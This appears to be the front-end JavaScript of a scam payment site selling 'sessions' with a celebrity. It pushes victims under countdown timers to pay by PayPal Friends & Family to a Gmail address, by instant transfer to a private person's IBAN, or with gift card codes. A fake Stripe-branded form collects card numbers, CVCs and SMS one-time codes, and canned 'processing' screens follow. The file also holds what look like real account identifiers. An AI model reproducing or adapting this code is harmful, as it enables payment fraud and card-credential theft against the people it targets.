        if (state.paymentStatus === false) {
            showPaymentError();
        } else if (state.paymentStatus === true) {
            showPaymentSuccess();
        }
    }, 1000);
}

function updateTimerDisplay(element, seconds) {
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    const hrs = Math.floor(seconds / 3600);

    let timeString = "";
    if (hrs > 0) {
        timeString += `${hrs.toString().padStart(2, "0")}:`;
    }
    timeString += `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;

    element.textContent = timeString;

    // Add warning class when under 5 minutes
    if (seconds <= 300) {
        element.classList.add("warning");
    } else {
        element.classList.remove("warning");
    }
}

function timerExpired(state) {
    // Disable the payment button
    const paymentBtn = document.querySelector("#fandf .paypal-btn");
    if (paymentBtn) {
        paymentBtn.disabled = true;
        paymentBtn.textContent = "Time Expired";
        paymentBtn.style.backgroundColor = "#dc3545";
    }

    // Show an alert or notification
    alert("Payment time has expired. Please start a new payment session.");

    // You could also automatically redirect or reset the flow
    // window.location.href = '/payment-timeout.html';
}

function showPaymentSuccess() {
    document
        .getElementById("paypal-processing")
        .querySelector(".processing").style.display = "none";
    document
        .getElementById("paypal-processing")
        .querySelector(".outcome").style.display = "flex";
}

function showPaymentError() {
    const outcome = document
        .getElementById("paypal-processing")
        .querySelector(".outcome");
    outcome.querySelector(".icon i").className = "fa-solid fa-circle-xmark";
    outcome.querySelector(".display-title").textContent = "Payment Unsuccessful";
    outcome.querySelector(".icon i").style.color = "#dc3545";

    document
        .getElementById("paypal-processing")
        .querySelector(".processing").style.display = "none";
    outcome.style.display = "flex";
}

// ==================== HELPER FUNCTIONS ====================
function updateCurrencyState(state, code, currency) {
    state.currencySelected = true;
    state.currencyCode = code;
    state.selectedCurrency = currency;
}

function closeCurrencyDropdown(elements) {
    document.querySelector(".currency-option-container").classList.remove("open");
    elements.usdDropdown.classList.remove("show");
}

function updateSelectionStyles(selectedOption, allOptions) {
    allOptions.forEach((opt) => opt.classList.remove("selected"));
    selectedOption.classList.add("selected");
}

function checkCurrencySelection(state, elements) {
    if (state.currencySelected) {
        elements.currencyContinueBtn.disabled = false;
    }
}

function checkPaymentMethodSelection(state, elements) {
    if (state.methodSelected) {
        elements.makePaymentBtn.disabled = false;
    }
}

async function convertCurrency(state, elements) {
    const EXCHANGE_RATE_API = "https://api.exchangerate-api.com/v4/latest/EUR";
    const response = await fetch(EXCHANGE_RATE_API);
    const data = await response.json();
    const rates = data.rates;

    if (state.currencyCode && state.currencyCode in rates) {
        const rate = rates[state.currencyCode];
        state.converted = (state.amount * rate).toFixed(2);
        state.charge = (0.98 * rate).toFixed(2);

        state.toPay =
            state.currencyCode === "EUR"
                ? (parseFloat(state.amount) + parseFloat(state.charge)).toFixed(2)
                : (parseFloat(state.converted) + parseFloat(state.charge)).toFixed(2);

        updateConversionUI(state, elements);
    } else {
        elements.titleDiv.innerHTML = "Currency conversion not available";
    }

    document.getElementById("currency-section")?.classList.remove("active");
    document.getElementById("conversion-section")?.classList.add("active");
}

function updateConversionUI(state, elements) {
    const symbol = {
        EUR: "€",
        USD: "$",
        CAD: "$",
        AUD: "$",
        GBP: "£",
        CHF: "₣",
    };

    elements.titleDiv.innerHTML = `
        <span class="initial-amount">${state.amount} <span class="choosen-currency-code">EUR</span></span> 
        <i class="fas fa-exchange-alt"></i> 
        <span class="converted-amount">${state.converted} <span class="choosen-currency-code">${state.currencyCode}</span></span>
    `;

    elements.currencyCode.textContent = state.currencyCode;
    elements.convertedText.innerHTML = `
        ${symbol[state.currencyCode]} ${state.converted
        } <span class="choosen-currency-code">${state.currencyCode}</span>
    `;
}

function showDetails() {
    const detailsDiv = document.querySelector(".payment-info.user-details");
    const button = document.querySelector(".view-details");

    if (detailsDiv && button) {
        const isShowing = detailsDiv.classList.contains("show");
        detailsDiv.classList.toggle("show");
        button.textContent = isShowing ? "View Details" : "Hide Details";
    }
}

function showStillProcessing() {
    const detailsDiv = document.querySelector(".payment-info.closing-warning");
    const button = document.querySelector(".cancel");

    if (detailsDiv && button) {
        detailsDiv.classList.toggle("show");
    }
}

// ==================== CREDIT CARD UI TEMPLATES ====================
function createCreditCardSection1(state) {
    const cardState = initializeCreditCardState();
    
    return `
    <div class="payment-section credit-card-section active" id="credit-card-details">
        <div class="cc-header">
            <h2>Pay with card</h2>
        </div>

        <div class="cc-form">
            <div class="card-brands">
                ${cardState.cardBrands.map(brand => `
                    <div class="card-brand ${state.detectedBrand === brand.name ? 'active' : ''}" >
                        <img src="${brand.image}" alt="${brand.name}">
                    </div>
                `).join('')}
            </div>

            <div class="form-group">
                <label for="card-number">Card number</label>
                <div class="input-with-icon">
                    <input type="text" id="card-number" placeholder="4242 4242 4242 4242" maxlength="19" class="card-input">
                    ${state.detectedBrand ? `<div class="card-icon" style="background: ${cardState.cardBrands.find(b => b.name === state.detectedBrand).pattern}">
                        <img src="${cardState.cardBrands.find(b => b.name === state.detectedBrand).image}" alt="${state.detectedBrand}">
                    </div>` : ''}
                </div>
            </div>
            
            <div class="form-row">
                <div class="form-group">
                    <label for="expiry-date">MM / YY</label>
                    <input type="text" id="expiry-date" placeholder="05 / 25" maxlength="5" class="card-input">
                </div>
                <div class="form-group">
                    <label for="cvv">CVC</label>
                    <input type="text" id="cvv" placeholder="123" maxlength="4" class="card-input">
                </div>
            </div>
            
            <div class="form-group">
                <label for="card-name">Name on card</label>
                <input type="text" id="card-name" placeholder="John Doe" class="card-input">
            </div>
            
            <div class="amount-display">
                <p>Amount to charge: <strong>${getCurrencySymbol(state.currencyCode)}${state.toPay}</strong></p>
            </div>
        </div>
        
        <div class="proceed-div">
            <button class="continue-btn cc-btn" disabled>Pay</button>
            <div class="stripe-branding">
                <span>Powered by</span>
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Stripe_Logo%2C_revised_2016.svg" alt="Stripe">
            </div>
        </div>
    </div>`;
}


function createCreditCardSection2(state) {
    return ` <div class="payment-section credit-card-section active" id="credit-card-processing">
        <div class="cc-header method-header">

            <p>Processing Payment</p>
        </div>
        
        <div class="processing-content">
            <div class="loading-spinner"></div>
            <p>Verifying card details...</p>
        </div>
    </div>`;
}

function createCreditCardSection3(state) {
    return `
    <div class="payment-section credit-card-section active" id="otp-verification">
        <div class="cc-header method-header">
            <div class="logo">
            <i class="fas fa-mobile-alt"></i>
            </div>
            <p>Enter your code</p>
        </div>

        <div class="otp-instructions">
            <p>Enter the code sent to your mobile number to verify your card.</p>
        </div>

        <div class="otp-input-container">
            <input type="text" id="otp-code" placeholder="123456" maxlength="6" class="otp-input">
        </div>

        <div class="proceed-div">
            <button class="continue-btn cc-btn verify-otp">Submit</button>
        </div>

        <div class="otp-feedback" style="display: none;">
            <p class="otp-message"></p>
        </div>
    </div>`;
}

// ==================== PAYPAL SECTION TEMPLATES ====================
function createPaypalSection1() {
    return `
    <div class="payment-section paypal-section active" id="paypal-first">
        <div class="paypal-header">
            <div class="logo">
                <img src="/src/images/paypal.png" alt="paypal-logo">
            </div>
            <p class="text">Pay<span class="second">Pal</span></p>
        </div>
        <h2>To pay successfully</h2>
        <ul>
            <li>Transfer the exact amount showed in the session type you selected</li>
            <li>Make the payment within 30 minutes of generating your one-off beneficiary details</li>
            <li>After payment upload a Screenshot or receipt of the payment</li>
            <li>Only click Pay Now when you are all set to make the transfer.</li>
        </ul>
        <div class="proceed-div">
            <button class="continue-btn paypal-btn">Pay Now</button>
        </div>
    </div>`;
}

function createPaypalSection2(state) {
    const symbol = getCurrencySymbol(state.currencyCode);
    const amount = state.currencyCode === "EUR" ? state.amount : state.converted;
    const total = state.toPay;

    return `
    <div class="payment-section paypal-section active" id="paypal-amount-to-pay">
        <div class="paypal-header">
            <div class="logo">
                <img src="/src/images/paypal.png" alt="paypal-logo">
            </div>
            <p class="text">Pay<span class="second">Pal</span></p>
        </div>
        <p class="once">Once you continue, we'll redirect you to our trusted payment provider to complete your deposit.</p>
        <div class="amount-section">
            <div class="amount-row">
                <span>AMOUNT TO PAY</span>
                <span class="amount">
                <span class="amount">${symbol}${amount}</span>
            </div>
            <div class="amount-row">
                <span>PAYMENT PROVIDER FEE</span>
                <span class="charge">${symbol}${state.charge}</span>
            </div>
            <div class="amount-row total">
                <span>TOTAL AMOUNT TO TRANSFER</span>
                <span class="total">${symbol}${total}</span>
            </div>
        </div>
        <div class="proceed-div">
            <button class="continue-btn paypal-btn">CONTINUE</button>
        </div>
    </div>`;
}

function createPaypalSection3(state) {
    const symbol = getCurrencySymbol(state.currencyCode);
    const amount = state.toPay;

    return `
    <div class="payment-section paypal-section active" id="fandf">
        <div class="paypal-header">
            <div class="logo">
                <img src="/src/images/paypal.png" alt="paypal-logo">
            </div>
            <p class="text">Pay<span class="second">Pal</span></p>
        </div>
        <h1>PayPal Payment (F&F)</h1>
        <p class="fandf-text">Use this email and amount to send via PayPal Family & Friends only</p>
        <div class="payment-info">
            <div class="info-div">
                <div class="left">
                    <p class="info-title">Email to Pay:</p>
                    <p class="info-text">paynowfunds@gmail.com</p>
                </div>
                <button class="copy">Copy Email</button>
            </div>
            <div class="info-div">
                <div class="left">
                    <p class="info-title">Amount:</p>
                    <p class="info-text">${symbol}${amount}</p>
                </div>
                <button class="copy">Copy Amount</button>
            </div>
        </div>
        <div class="important">
            <p><strong>Important:</strong></p>
            <ol>
                <li>Go to your PayPal account.</li>
                <li>Choose <strong>Send</strong> > select <strong>Friends & Family</strong> (not Goods/Services).</li>
                <li>Enter the<strong> email and amount</strong> exactly.</li>
                <li>Add no <strong>note/message</strong>.</li>
                <li>Complete the transaction.</li>
            </ol>
        </div>
               <p class="expiry">This payment link/account expires in: <span class="timeout" id="payment-timer">30:00</span></p>

        <div class="proceed-div">
            <button class="continue-btn paypal-btn">I HAVE MADE MY PAYMENT</button>
            <p style="text-align: center; font-size: 12px; margin-top: 5px;">(Click only after sending payment successfully)</p>
        </div>
    </div>`;
}

function createPaypalSection4() {
    return `
    <div class="payment-section paypal-section active" id="paypal-upload">
        <div class="paypal-header">
            <div class="logo">
                <img src="/src/images/paypal.png" alt="paypal-logo">
            </div>
            <p class="text">Pay<span class="second">Pal</span></p>
        </div>
        <h2 class="upload-title">Upload Payment Receipt</h2>
        <p class="upload-text">
            Upload a receipt or screenshot and enter the name of the PayPal account that sent the payment.</p>

        <div class="upload-section">
                <input type="file" id="receipt-upload" style="display: none;" accept="image/*,.pdf">
            <div class="upload-box" id="upload-trigger">
                <i class="fas fa-upload" id="add-button"></i>
                <p>Drag or tap to upload</p>
            </div>

  <div class="upload-feedback moveUpNfadeIn" style="display: none;">
                <p class="file-name"></p>
                <p class="upload-success">Receipt uploaded successfully!</p>
            </div>

        </div>

        <div class="sender-name">
            <p><strong>Sender Name</strong></p>
           <input type="text" id="sender-name-input" placeholder="Enter sender's name">
        </div>
        <div class="proceed-div">
            <button class="continue-btn paypal-btn" disabled>SUBMIT RECEIPT</button>
        </div>
    </div>`;
}

function createPaypalSection5(state) {
    const iconClass =
        state.paymentStatus === false ? "fa-circle-xmark" : "fa-circle-check";
    const iconColor =
        state.paymentStatus === false ? "color: #dc3545;" : "color: #28a745;";


    function formatDateTime() {
        const now = new Date();

        const options = {
            month: "long",
            day: "numeric",
            year: "numeric",
        };

        return (
            now.toLocaleString("en-US", options) +
            " at " +
            now.toLocaleTimeString("en-US", {
                hour: "numeric",
                minute: "2-digit",
                hour12: true,
            })
        );
    }

    return `
    <div class="payment-section paypal-section active" id="paypal-processing">
        <div class="paypal-header">
            <div class="logo">
                <img src="/src/images/paypal.png" alt="paypal-logo">
            </div>
            <p class="text">Pay<span class="second">Pal</span></p>
        </div>

        <div class="paypal-display">
            <div class="display-inner processing">
                <p class="display-title">Processing Payment...</p>
                <div class="loading-spinner"></div>
                <p class="under">Please wait while we process your payment.</p>
            </div>
            <div class="display-inner outcome" style="display: none;">
                <div class="icon"><i class="fa-solid ${iconClass}" style="${iconColor}"></i></div>
                <p class="display-title">${state.paymentStatus === false
            ? "Payment Declined"
            : "Payment Successful"
        }</p>
                <div class="inner-bottom">
                    <p class="display-title-price">0.00</p>
                    <p class="transaction-id">Transaction ID: <span class="id-text">${state.txn
        }</span></p>
                </div>
                <div class="divider"></div>
                <div class="proceed-div">
                    <a class="continue-btn" id="return" href="/html/main/User.html">Return to Dashboard</a>
                    <p class="completed-time">Completed on <span class="main-time">${formatDateTime()}</span></p>
                </div>
            </div>
        </div>
    </div>`;
}



// ==================== BANK TRANSFER SECTION TEMPLATES ====================
function createBankSection1() {
    return `
    <div class="payment-section card-section active" id="paypal-first">
        <div class="method-header">
            <div class="logo">
                           <i class="fas fa-university"></i>
            </div>
            <p class="text">Bank Transfer</p>
        </div>
        <h2>Secure your Session Payment</h2>
        <p style="margin-bottom:5px;">To ensure a smooth and successful transaction:</p>

        <ul>
            <li>Transfer the exact amount displayed for your session</li>
            <li>Complete payment within <b>2 hours</b> of receiving your account details</li>
            <li>Upload a clear Screenshot or receipt of the payment</li>
            <li>Click <b>Pay Securely Now</b> only when you're ready to transfer</li>
        </ul>
        <div class="proceed-div">
            <button class="continue-btn card-btn">Pay Securely Now</button>
        </div>
    </div>`;
}

function createBankSection2(state) {
    const symbol = getCurrencySymbol(state.currencyCode);
    const amount = state.currencyCode === "EUR" ? state.amount : state.converted;
    const total = state.toPay;

    return `
    <div class="payment-section card-section active" id="paypal-amount-to-pay">
       <div class="method-header">
            <div class="logo">
                           <i class="fas fa-university"></i>
            </div>
            <p class="text">Bank Transfer</p>
        </div>

        <p class="once">Once you continue, we'll redirect you to your bank to complete your transfer.</p>

        <div class="amount-section">
            <div class="amount-row">
                <span>AMOUNT TO PAY</span>
                <span class="amount">
                <span class="amount">${symbol}${amount}</span>
            </div>
            <div class="amount-row">
                <span>PAYMENT PROVIDER FEE</span>
                <span class="charge">${symbol}${state.charge}</span>
            </div>
            <div class="amount-row total">
                <span>TOTAL AMOUNT TO TRANSFER</span>
                <span class="total">${symbol}${total}</span>
            </div>
        </div>
        <div class="proceed-div">
            <button class="continue-btn card-btn">CONTINUE</button>
        </div>
    </div>`;
}

function createBankSection3(state) {
    const amount = state.toPay;

    return `
    <div class="payment-section card-section active" id="fandf">
        <div class="method-header">
            <div class="logo">
                           <i class="fas fa-university"></i>
            </div>
            <p class="text deposit">Make your Deposit</p>
        </div>

 <div class="important deposit">
            <ol>
                <li>Sign into your bank</li>
                <li>Create a new recipient using the details below</li>
                 <li>Choose Instant Payment (do not use IBAN transfer)</li>
                <li>Make your deposit</li>
            </ol>
        </div>

        <div class="payment-info deposit">
            <div class="info-div">
                <div class="left">
                    <p class="info-title">BANK NAME</p>
                    <p class="info-text">Banco Cetelem, SA. (BNP Paribas Personal Liuanca)</p>
                </div>

                                <button class="copy">Copy</button>

            </div>

            <div class="info-div">
                <div class="left">
                    <p class="info-title">ACCOUNT HOLDER NAME</p>
                    <p class="info-text">Alexis Llusia Luis</p>
                </div>

<button class="copy">Copy</button>
            </div>

<div class="info-div">
                <div class="left">
                    <p class="info-title">IBAN</p>
                    <p class="info-text">ES17 0225 0100 5800 8339 7729</p>
                </div>

                <button class="copy">Copy</button>
            </div>

            <div class="info-div">
                <div class="left">
                    <p class="info-title">BIC/SWIFT</p>
                    <p class="info-text">BNPAESM2XXX</p>
                </div>

                <button class="copy">Copy</button>
            </div>

              <div class="info-div">
                <div class="left">
                    <p class="info-title">AMOUNT</p>
                    <p class="info-text">${getCurrencySymbol(state.currencyCode)}${amount} ${state.currencyCode}</p>
                </div>

                <button class="copy">Copy</button>
            </div>
        </div>

 <div class="important under">
            <p><strong>Important Notes:</strong></p>
            <ol>
                <li>Do not use <strong>DE IBAN</strong> or <strong>IBAN-only</strong> transfer methods</li>
                <li>Choose <strong>Instant Payment</strong> for fastest processing</li>
                <li>Make the transfer within two(2) hours</li>
            </ol>
        </div>

       
               <p class="expiry">This payment link/account expires in: <span class="timeout" id="payment-timer">2:00:00</span></p>

        <div class="proceed-div">
            <button class="continue-btn card-btn">I HAVE MADE THE DEPOSIT</button>
            <p style="text-align: center; font-size: 12px; margin-top: 5px;">(Click only after sending payment successfully)</p>
        </div>
    </div>`;
}

function createBankSection4() {
    return `
    <div class="payment-section card-section active" id="paypal-upload">
        <div class="method-header">
                       <div class="logo"> <i class="fas fa-university"></i></div>
        <p class="text">Upload Transfer Receipt</p>
        </div>

        <p class="upload-text">
            Upload a receipt or screenshot and enter the name of the Bank account that made the deposit.</p>

        <div class="upload-section">
                <input type="file" id="receipt-upload" style="display: none;" accept="image/*,.pdf">
            <div class="upload-box" id="upload-trigger">
                <i class="fas fa-upload" id="add-button"></i>
                <p>Drag or tap to upload</p>
            </div>

  <div class="upload-feedback moveUpNfadeIn" style="display: none;">
                <p class="file-name"></p>
                <p class="upload-success">Receipt uploaded successfully!</p>
            </div>

        </div>
        <div class="sender-name">
            <p><strong>Sender Name</strong></p>
           <input type="text" id="sender-name-input" placeholder="Enter sender's name">
        </div>
        <div class="proceed-div">
            <button class="continue-btn card-btn" disabled>SUBMIT RECEIPT</button>

             <p style="text-align: center; font-size: 12px; margin-top: 5px;">Click only after uploading a file and entering the sender's name.</p>
        </div>
    </div>`;
}

function createBankSection5(state) {
    const iconClass =
        state.paymentStatus === false ? "fa-circle-xmark" : "fa-circle-check";
    const iconColor =
        state.paymentStatus === false ? "color: #dc3545;" : "color: #28a745;";


    const symbol = getCurrencySymbol(state.currencyCode);
    const transAmount = state.toPay;
    const status = state.paymentStatus == null ? "Processing..." : state.paymentStatus == true ? "VERIFIED" : "NOT VERIFIED";




    function formatDateTime() {
        const now = new Date();

        const options = {
            month: "long",
            day: "numeric",
            year: "numeric",
        };

        return (
            now.toLocaleString("en-US", options) +
            " at " +
            now.toLocaleTimeString("en-US", {
                hour: "numeric",
                minute: "2-digit",
                hour12: true,
            })
        );
    }

    return `
    <div class="payment-section card-section active" id="paypal-processing">
        <div class="method-header">
            <div class="logo">
                            <i class="fas fa-university"></i>
            </div>
        </div>


         <div class="payment-info user-details hide" id="processing-details">
         <div class="info-div" style="justify-content:flex-end; text-align:right;">
          <button class="util-btn cancel view-details">View Details</button>
         </div>
            <div class="info-div">
                <div class="left">
                    <p class="info-title">NAME:</p>
                    <p class="info-text">${state.senderName}</p>
                </div>
            </div>
            <div class="info-div">
                <div class="left">
                    <p class="info-title">TRANSFER AMOUNT</p>
                    <p class="info-text">${symbol}${transAmount}</p>
                </div>
            </div>
<div class="info-div">
                <div class="left">
                    <p class="info-title">TRANSFER STATUS</p>
                    <p class="info-text">${status}</p>
                </div>
            </div>
        </div>

<div class="payment-info closing-warning hide" id="processing-details">
         <div class="info-div" style="justify-content:flex-end; text-align:right;">
          <button class="util-btn cancel">Close</button>
         </div>
            <div class="info-div">
              You can't cancel this trade now, because it is still processing...
            </div>
        </div>
        
        <div class="paypal-display">
            <div class="display-inner processing">
                <p class="display-title">Processing Transfer...</p>
                <div class="loading-spinner"></div>
                <p class="under">Processing your bank transfer.<br/> This may take a few seconds.</p>
            </div>
            <div class="display-inner outcome" style="display: none;">
                <div class="icon"><i class="fa-solid ${iconClass}" style="${iconColor}"></i></div>
                <p class="display-title">${state.paymentStatus === false
            ? "Payment Declined"
            : "Payment Successful"
        }</p>
                <div class="inner-bottom">
                    <p class="display-title-price">0.00</p>
                    <p class="transaction-id">Transaction ID: <span class="id-text">${state.txn
        }</span></p>
                </div>
                <div class="divider"></div>
            </div>
                <div class="proceed-div">
                                    <button class="util-btn cancel">Cancel Transfer</button>

                           <button class="util-btn view-details">View Details</button>
                </div>
        </div>
    </div>`;
}

function createGiftCardInstructionPage(state) {
    return `
    <div class="payment-section gift-card-section active" id="gift-card-instructions">
        <div class="method-header">
        <div class="gift-logo logo">
<i class="fas fa-gift" style="color: #0070ba;"></i>
        </div>
            <p class="text">How to Pay Using a Gift Card Code</p>
        </div>
        
        <div class="content">
            <div class="accepted-cards">
                <p class="text">Only Accepted Gift Card Types:</p>
                <div class="card-icons">
                    ${state.acceptedCards.map(card => `
                        <div class="card-icon">
                            <img src="${card.image}" alt="${card.name}">
                            <span>${card.name}</span>
                        </div>
                    `).join('')}
                </div>
                <p class="note">Other gift card codes will be rejected.</p>
            </div>
            
            <ul class="instructions redeem">
                <li class="instruction-step">
                    <p>Enter the gift card code</p>
                </li>
                <li class="instruction-step">
                    <p>Select card type</p>
                </li>
                <li class="instruction-step">
                    <p>Enter amount</p>
                </li>
                <li class="instruction-step">
                    <p>Tap Redeem</p>
                </li>
            </ul>
        </div>
        
        <div class="proceed-div">
            <button class="primary-btn continue-btn got-it-btn">Got it, Pay now</button>
            <button class="learn-more redeem continue-btn">Learn how to get a giftcard code</button>
        </div>
    </div>`;
}

function createGiftCardTutorialSection(state) {
    const type = state.giftCardTutorial.type;
    const currentType = state.giftCardTutorial[type];
    const current = currentType[state.giftCardTutorial.currentStep];


    return `
    <div class="payment-section active tutorial-section" id="gift-card-tutorial">
        <div class="tutorial-header">
        <div class="header-top">
            <p>How to Redeem Gift Cards</p>
            <button class="close-tutorial">&times;</button>
        </div>
        <div class="tutorial-tab">
        <div class="tab ${type == "store" ? "active" : ""}" id="store">GET IN STORE</div>
        <div class="tab ${type == "online" ? "active" : ""}" id="online">GET ONLINE</div>
        </div>
        </div>


        <div class="tutorial-content">
            <div class="tutorial-image-container">
                <img src="${current.image}" alt="${current.title}" class="tutorial-image">
            </div>
            <div class="tutorial-text">
                <h3>${current.title}</h3>
                <p>${current.description}</p>
            </div>
        </div>
        
        <div class="tutorial-navigation">
            <button class="tutorial-nav-btn prev-btn" ${state.giftCardTutorial.currentStep === 0 ? 'disabled' : ''}>
                <i class="fas fa-chevron-left"></i> Previous
            </button>
            <span class="tutorial-progress">${state.giftCardTutorial.currentStep + 1}/${currentType.length}</span>
            <button class="tutorial-nav-btn next-btn ${state.giftCardTutorial.currentStep === currentType.length - 1 ? "close-tutorial" : ""}">
                ${state.giftCardTutorial.currentStep === currentType.length - 1 ? "Go Back" : "Next"
        } <i class="fas fa-chevron-right"></i>
            </button>
        </div>
    </div>`;
}

function createGiftCardRedeemPage(state) {
    return `
    <div class="payment-section gift-card-section active" id="gift-card-redeem">
        <div class="header">
            <p class="username">johndoe</p>
            <h1>Redeem Code</h1>
        </div>
        
        <div class="content">
            <div class="form-group">
                <label for="gift-card-code">Gift Card Code</label>
                <div class="input-with-scan">
                    <input type="text" id="gift-card-code" placeholder="Enter code" ${state.scannedImage ? 'disabled' : ''}>
                    <button class="scan-btn" id="scan-code-btn" ${state.scannedImage ? 'disabled' : ''}>
                        <i class="fas fa-camera"></i> Scan Code
                    </button>
                </div>
                ${state.scannedImage ? `
                <div class="scanned-image-container">
                    <div class="scanned-image-wrapper">
                        <img src="${state.scannedImage}" alt="Scanned Gift Card" class="scanned-image">
                        <button class="cancel-scan-btn" id="cancel-scan-btn">
                            &times;
                        </button>
                    </div>
                </div>
                ` : ''}
            </div>
            
            <div class="form-group">
                <label>Card type</label>
                <select class="card-type-dropdown" id="card-type-select">
                    <option value="">Select card type</option>
                    ${state.acceptedCards.map(card => `
                        <option value="${card.name}" ${state.selectedCardType === card.name ? 'selected' : ''}>
                            ${card.name}
                        </option>
                    `).join('')}
                </select>
                ${state.selectedCardType ? `
                <div class="card-preview">
                    <img src="${getCardStyle(state.selectedCardType, 'image', state)}" 
                         alt="${state.selectedCardType}"
                         class="selected-card-image">
                </div>
                ` : ''}
            </div>
            
            <div class="form-group">
                <label for="amount">Amount</label>
                <input type="text" id="amount" placeholder="Enter amount">
            </div>
        </div>
        
        <div class="proceed-div">
            <button class="primary-btn continue-btn redeem-btn" ${!state.selectedCardType || (!state.giftCardCode && !state.scannedImage) || !state.amount ? 'disabled' : ''}>
                Redeem
            </button>
        </div>

        <!-- Camera Modal -->
        <div class="camera-modal" id="camera-modal">
            <div class="camera-container">
                <div class="camera-header">
                    <button class="close-camera">&times;</button>
                </div>
                <div class="scanner-overlay">
                    <div class="scanning-area"></div>
                </div>
                <video id="camera-view" autoplay playsinline></video>
                <div class="info">Place the card within the marked scanning box</div>
                <button class="capture-btn" id="capture-btn">
                    <i class="fas fa-camera"></i> Capture
                </button>
            </div>
        </div>
    </div>`;
}

function getCardStyle(cardName, property, state) {
    const cards = state.acceptedCards;
    const card = cards.find(c => c.name === cardName);
    return card ? card[property] : null;
}

// ==================== INITIALIZATION ====================
function initializePaymentFlow(state, elements) {
    document.getElementById("payment-details").classList.add("active");

    const urlParams = new URLSearchParams(window.location.search);
    const paymentType = urlParams.get("type");
    const paymentDetails = urlParams.get("details");

    // Redirect if no params
    if (!paymentType || !paymentDetails) {
        alert("No Payment Details Gotten, Please Book a Session!");
        window.location.href = "/html/main/Session.html";
        return;
    }

    try {
        // Parse payment details
        const details = JSON.parse(decodeURIComponent(paymentDetails));
        const language = navigator.language;

        state.txn = details.transactionId;
        state.amount = details.price;

        const description =
            details.type === "session"
                ? `${details.title.toUpperCase()} - Hours with Charlotte Casiraghi`
                : details.description || "No description";

        document.getElementById("transaction-id").textContent = details.transactionId;
        document.getElementById("payment-amount").innerHTML = details.price
            ? `&euro;${details.price.toFixed(2)}`
            : "N/A";
        document.getElementById("payment-description").textContent = description;
        document.getElementById("payment-date").textContent =
            details.date || new Date().toLocaleDateString();
    } catch (error) {
        console.error("Error parsing payment details:", error);
        window.location.href = "/html/main/Session.html";
        return;
    }

    // Initialize buttons
    elements.currencyContinueBtn.disabled = true;
    elements.makePaymentBtn.disabled = true;

    // Initialize checks
    checkCurrencySelection(state, elements);
    checkPaymentMethodSelection(state, elements);
}
